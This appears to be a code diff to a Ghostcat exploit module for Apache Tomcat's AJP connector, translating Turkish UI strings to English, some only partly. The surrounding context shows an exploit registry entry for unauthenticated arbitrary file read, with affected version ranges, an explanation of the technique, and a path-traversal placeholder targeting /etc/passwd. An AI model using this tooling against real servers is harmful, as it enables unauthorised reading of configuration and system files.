@@ -84,7 +84,7 @@ def _parse_response(data: bytes):
 def ghostcat(params) -> dict:
     host = (params.get("host") or "").strip()
     if not host:
-        return {"ok": False, "success": False, "error": "host gerekli (AJP host)"}
+        return {"ok": False, "success": False, "error": "host required (AJP host)"}
     if ":" in host:
         host, _, port = host.partition(":")
     else:
@@ -134,7 +134,7 @@ def _in(label, key, req, default="", ph=""):
 
 _INPUTS = [
     _in("AJP host:port", "host", True, "", "127.0.0.1:8009"),
-    _in("Okunacak dosya", "file", False, "/WEB-INF/web.xml", "/WEB-INF/web.xml | ../../../../../etc/passwd"),
+    _in("Okunacak file", "file", False, "/WEB-INF/web.xml", "/WEB-INF/web.xml | ../../../../../etc/passwd"),
     _in("servlet_path", "servlet_path", False, "/index.jsp", "/index.jsp"),
     _in("context_path", "context_path", False, "/", "/"),
     _in("Kanit (ops.)", "marker", False, "", "web-app | root:x:0:0"),
@@ -147,7 +147,7 @@ EXPLOITS = {
         "type": "FileRead", "preauth": True,
         "affected": ["7.0.x<7.0.100", "8.5.x<8.5.51", "9.0.x<9.0.31"],
         "note": ("Native AJP/1.3 (raw socket): javax.servlet.include.* attribute'lari ile Tomcat'i "
-                 "keyfi dosyayi include etmeye zorlar. Kanit = dosyanin gercek byte'lari "
+                 "keyfi dosyayi include etmeye zorlar. Kanit = dosyanin real byte'lari "
                  "(WEB-INF/web.xml, MANIFEST, /etc/passwd). AJP 8009 open + secretRequired=false "
                  "(pre-9.0.31/8.5.51/7.0.100) hedefte calisir."),
         "inputs": list(_INPUTS),
